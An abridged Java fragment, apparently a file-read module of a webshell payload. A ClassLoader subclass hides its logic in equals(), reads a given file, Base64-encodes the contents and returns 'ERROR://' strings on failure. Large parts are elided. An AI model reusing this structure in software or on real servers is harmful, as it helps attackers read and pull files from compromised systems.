...
public class file_readbuffer extends ClassLoader
{
    public file_readbuffer(ClassLoader objParent) { super(objParent); }
    public file_readbuffer() { super(file_readbuffer.class.getClassLoader()); }
    ...
    public boolean equals(Object objParam)
    {
        ...
        try
        {
            ...
            Path filePath = Paths.get(szPath);
            if (Files.exists(filePath))
            {
                if (Files.isRegularFile(filePath))
                {
                    byte[] abContent = Files.readAllBytes(filePath);
                    sb.append(Base64.getEncoder().encodeToString(abContent));
                }
                else
                {
                    sb.append("ERROR://This file is a directory or a special file, not a regular file.");
                }
            }
            else
            {
                sb.append("ERROR://Unable to open file: " + szPath);
            }
